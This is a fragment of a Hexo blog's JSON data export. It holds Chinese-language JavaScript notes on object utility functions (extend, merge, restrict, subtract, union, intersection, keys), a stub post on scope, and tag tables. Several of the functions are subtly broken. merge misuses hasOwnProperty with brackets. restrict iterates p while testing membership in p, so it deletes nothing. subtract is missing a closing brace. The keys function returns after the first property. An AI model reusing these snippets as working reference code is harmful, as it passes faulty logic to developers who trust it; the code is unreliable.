class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">extend</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">        o[prop]=p[prop] <span class=\"comment\">//将属性添加至o中</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"merge\"><a href=\"#merge\" class=\"headerlink\" title=\"merge\"></a>merge</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">merge</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(o.<span class=\"property\">hasOwnProperty</span>[prop]) <span class=\"keyword\">continue</span>; <span class=\"comment\">//过滤掉o中存在的属性</span></span><br><span class=\"line\">        o[prop]=p[prop] <span class=\"comment\">//将属性添加至o中</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"restrict-p-中没有这个同名属性，从-o-中删除这个属性\"><a href=\"#restrict-p-中没有这个同名属性，从-o-中删除这个属性\" class=\"headerlink\" title=\"restrict p 中没有这个同名属性，从 o 中删除这个属性\"></a>restrict p 中没有这个同名属性，从 o 中删除这个属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">restrict</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!(prop <span class=\"keyword\">in</span> p))&#123; <span class=\"comment\">// 如果p中没有这个属性，从o中删除这个属性</span></span><br><span class=\"line\">        <span class=\"keyword\">delete</span> o[prop] <span class=\"comment\">//删除</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"subtract-p-中有这个同名属性，从-o-中删除这个属性\"><a href=\"#subtract-p-中有这个同名属性，从-o-中删除这个属性\" class=\"headerlink\" title=\"subtract p 中有这个同名属性，从 o 中删除这个属性\"></a>subtract p 中有这个同名属性，从 o 中删除这个属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">subtract</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">        <span class=\"keyword\">delete</span> o[prop]  <span class=\"comment\">// 如果p中有这个属性，从o中删除这个属性</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"union-新对象同时拥有-o-和-p-的属性\"><a href=\"#union-新对象同时拥有-o-和-p-的属性\" class=\"headerlink\" title=\"union 新对象同时拥有 o 和 p 的属性\"></a>union 新对象同时拥有 o 和 p 的属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">union</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">extend</span>(<span class=\"title function_\">extend</span>(&#123;&#125;,o),p)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"intersection-新对象同时拥有-o-和-p-的属性\"><a href=\"#intersection-新对象同时拥有-o-和-p-的属性\" class=\"headerlink\" title=\"intersection 新对象同时拥有 o 和 p 的属性\"></a>intersection 新对象同时拥有 o 和 p 的属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">intersection</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">restrict</span>(<span class=\"title function_\">extend</span>(&#123;&#125;,o),p)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"kyes-新数组-中含有-o-的可枚举的自有属性\"><a href=\"#kyes-新数组-中含有-o-的可枚举的自有属性\" class=\"headerlink\" title=\"kyes 新数组 中含有 o 的可枚举的自有属性\"></a>kyes 新数组 中含有 o 的可枚举的自有属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">kyes</span>(<span class=\"params\">o</span>)&#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(<span class=\"keyword\">typeof</span> o !== <span class=\"string\">&quot;object&quot;</span>) <span class=\"keyword\">throw</span> <span class=\"title class_\">TypeError</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">var</span> result =[]</span><br><span class=\"line\">   <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> o)&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(o.<span class=\"title function_\">hasOwnProperty</span>(prop))&#123;</span><br><span class=\"line\">           result.<span class=\"title function_\">push</span>(prop)</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"工具函数\"><a href=\"#工具函数\" class=\"headerlink\" title=\"工具函数\"></a>工具函数</h3><h4 id=\"extend\"><a href=\"#extend\" class=\"headerlink\" title=\"extend\"></a>extend</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">extend</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">        o[prop]=p[prop] <span class=\"comment\">//将属性添加至o中</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"merge\"><a href=\"#merge\" class=\"headerlink\" title=\"merge\"></a>merge</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">merge</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(o.<span class=\"property\">hasOwnProperty</span>[prop]) <span class=\"keyword\">continue</span>; <span class=\"comment\">//过滤掉o中存在的属性</span></span><br><span class=\"line\">        o[prop]=p[prop] <span class=\"comment\">//将属性添加至o中</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"restrict-p-中没有这个同名属性，从-o-中删除这个属性\"><a href=\"#restrict-p-中没有这个同名属性，从-o-中删除这个属性\" class=\"headerlink\" title=\"restrict p 中没有这个同名属性，从 o 中删除这个属性\"></a>restrict p 中没有这个同名属性，从 o 中删除这个属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">restrict</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!(prop <span class=\"keyword\">in</span> p))&#123; <span class=\"comment\">// 如果p中没有这个属性，从o中删除这个属性</span></span><br><span class=\"line\">        <span class=\"keyword\">delete</span> o[prop] <span class=\"comment\">//删除</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"subtract-p-中有这个同名属性，从-o-中删除这个属性\"><a href=\"#subtract-p-中有这个同名属性，从-o-中删除这个属性\" class=\"headerlink\" title=\"subtract p 中有这个同名属性，从 o 中删除这个属性\"></a>subtract p 中有这个同名属性，从 o 中删除这个属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">subtract</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> p)&#123; <span class=\"comment\">// 遍历p中的所有属性</span></span><br><span class=\"line\">        <span class=\"keyword\">delete</span> o[prop]  <span class=\"comment\">// 如果p中有这个属性，从o中删除这个属性</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"union-新对象同时拥有-o-和-p-的属性\"><a href=\"#union-新对象同时拥有-o-和-p-的属性\" class=\"headerlink\" title=\"union 新对象同时拥有 o 和 p 的属性\"></a>union 新对象同时拥有 o 和 p 的属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">union</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">extend</span>(<span class=\"title function_\">extend</span>(&#123;&#125;,o),p)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"intersection-新对象同时拥有-o-和-p-的属性\"><a href=\"#intersection-新对象同时拥有-o-和-p-的属性\" class=\"headerlink\" title=\"intersection 新对象同时拥有 o 和 p 的属性\"></a>intersection 新对象同时拥有 o 和 p 的属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">intersection</span>(<span class=\"params\">o,p</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">restrict</span>(<span class=\"title function_\">extend</span>(&#123;&#125;,o),p)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"kyes-新数组-中含有-o-的可枚举的自有属性\"><a href=\"#kyes-新数组-中含有-o-的可枚举的自有属性\" class=\"headerlink\" title=\"kyes 新数组 中含有 o 的可枚举的自有属性\"></a>kyes 新数组 中含有 o 的可枚举的自有属性</h4><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">kyes</span>(<span class=\"params\">o</span>)&#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span>(<span class=\"keyword\">typeof</span> o !== <span class=\"string\">&quot;object&quot;</span>) <span class=\"keyword\">throw</span> <span class=\"title class_\">TypeError</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"keyword\">var</span> result =[]</span><br><span class=\"line\">   <span class=\"keyword\">for</span>(prop <span class=\"keyword\">in</span> o)&#123;</span><br><span class=\"line\">       <span class=\"keyword\">if</span>(o.<span class=\"title function_\">hasOwnProperty</span>(prop))&#123;</span><br><span class=\"line\">           result.<span class=\"title function_\">push</span>(prop)</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"详解作用域","date":"2019-04-07T05:35:30.000Z","_content":"\n# 前提知识\n\n## 编译原理\n\n# 什么是作用域\n","source":"_posts/详解作用域.md","raw":"---\ntitle: 详解作用域\ndate: 2019-04-07 13:35:30\ntags:\n  - 笔记\n  - JavaScript\n---\n\n# 前提知识\n\n## 编译原理\n\n# 什么是作用域\n","slug":"详解作用域","published":1,"updated":"2022-02-23T03:09:02.935Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950d8001en0w14g5z0gvf","content":"<h1 id=\"前提知识\"><a href=\"#前提知识\" class=\"headerlink\" title=\"前提知识\"></a>前提知识</h1><h2 id=\"编译原理\"><a href=\"#编译原理\" class=\"headerlink\" title=\"编译原理\"></a>编译原理</h2><h1 id=\"什么是作用域\"><a href=\"#什么是作用域\" class=\"headerlink\" title=\"什么是作用域\"></a>什么是作用域</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前提知识\"><a href=\"#前提知识\" class=\"headerlink\" title=\"前提知识\"></a>前提知识</h1><h2 id=\"编译原理\"><a href=\"#编译原理\" class=\"headerlink\" title=\"编译原理\"></a>编译原理</h2><h1 id=\"什么是作用域\"><a href=\"#什么是作用域\" class=\"headerlink\" title=\"什么是作用域\"></a>什么是作用域</h1>"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"ckzz950cx000dn0w197633nxa","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950cz000gn0w13p4afly5"},{"post_id":"ckzz950cx000dn0w197633nxa","tag_id":"ckzz950cr0004n0w18rwv9o86","_id":"ckzz950d1000in0w1dv33dj5r"},{"post_id":"ckzz950cn0001n0w1fj454w03","tag_id":"ckzz950cr0004n0w18rwv9o86","_id":"ckzz950d2000ln0w14fbh7sbu"},{"post_id":"ckzz950cn0001n0w1fj454w03","tag_id":"ckzz950cv0009n0w1hkra2fy3","_id":"ckzz950d3000nn0w19d72hhlk"},{"post_id":"ckzz950cn0001n0w1fj454w03","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950d3000on0w11qdx5xtp"},{"post_id":"ckzz950cy000en0w19emt9imz","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950d3000qn0w17suw06xc"},{"post_id":"ckzz950cq0003n0w19g3kbtyb","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950d4000rn0w11xel50i2"},{"post_id":"ckzz950cq0003n0w19g3kbtyb","tag_id":"ckzz950d2000kn0w15jkee30n","_id":"ckzz950d4000tn0w1htn8g2m5"},{"post_id":"ckzz950cu0007n0w1ao168pm7","tag_id":"ckzz950d3000pn0w17gsz97yp","_id":"ckzz950d4000vn0w18o9daqyl"},{"post_id":"ckzz950cu0007n0w1ao168pm7","tag_id":"ckzz950d4000sn0w1clto7ysa","_id":"ckzz950d4000wn0w1gajcheob"},{"post_id":"ckzz950cv0008n0w1bc30e8ms","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950d5000yn0w14fjuc58s"},{"post_id":"ckzz950cv0008n0w1bc30e8ms","tag_id":"ckzz950cr0004n0w18rwv9o86","_id":"ckzz950d5000zn0w18hn89c3y"},{"post_id":"ckzz950cw000an0w1csenfjxd","tag_id":"ckzz950d4000sn0w1clto7ysa","_id":"ckzz950d50011n0w1hw397ej3"},{"post_id":"ckzz950d0000hn0w188oyfn7i","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950d50013n0w15b5c2nbn"},{"post_id":"ckzz950d0000hn0w188oyfn7i","tag_id":"ckzz950d50010n0w13jxv7pwg","_id":"ckzz950d50014n0w10jsg0vzp"},{"post_id":"ckzz950d2000jn0w1ezd32nbh","tag_id":"ckzz950d4000sn0w1clto7ysa","_id":"ckzz950d60018n0w14a8y2j1w"},{"post_id":"ckzz950d2000jn0w1ezd32nbh","tag_id":"ckzz950d50015n0w14izv94ys","_id":"ckzz950d60019n0w14c22a82w"},{"post_id":"ckzz950d2000jn0w1ezd32nbh","tag_id":"ckzz950d60016n0w1e244arg7","_id":"ckzz950d6001bn0w16rod13nd"},{"post_id":"ckzz950d3000mn0w1fe32hz3v","tag_id":"ckzz950d60017n0w15fs1828k","_id":"ckzz950d7001cn0w1ejjp60ne"},{"post_id":"ckzz950d3000mn0w1fe32hz3v","tag_id":"ckzz950d6001an0w12hg96qa3","_id":"ckzz950d7001dn0w13m2bgt58"},{"post_id":"ckzz950d8001en0w14g5z0gvf","tag_id":"ckzz950cx000cn0w198js8p5y","_id":"ckzz950d8001fn0w17zm99t3e"},{"post_id":"ckzz950d8001en0w14g5z0gvf","tag_id":"ckzz950cr0004n0w18rwv9o86","_id":"ckzz950d8001gn0w1bd470rel"}],"Tag":[{"name":"JavaScript","_id":"ckzz950cr0004n0w18rwv9o86"},{"name":"Node","_id":"ckzz950cv0009n0w1hkra2fy3"},{"name":"笔记","_id":"ckzz950cx000cn0w198js8p5y"},{"name":"ES6","_id":"ckzz950d2000kn0w15jkee30n"},{"name":"Markdown","_id":"ckzz950d3000pn0w17gsz97yp"},{"name":"教程","_id":"ckzz950d4000sn0w1clto7ysa"},{"name":"CSS","_id":"ckzz950d50010n0w13jxv7pwg"},{"name":"hexo","_id":"ckzz950d50015n0w14izv94ys"},{"name":"github","_id":"ckzz950d60016n0w1e244arg7"},{"name":"javascript","_id":"ckzz950d60017n0w15fs1828k"},{"name":"对象枚举","_id":"ckzz950d6001an0w12hg96qa3"}]}}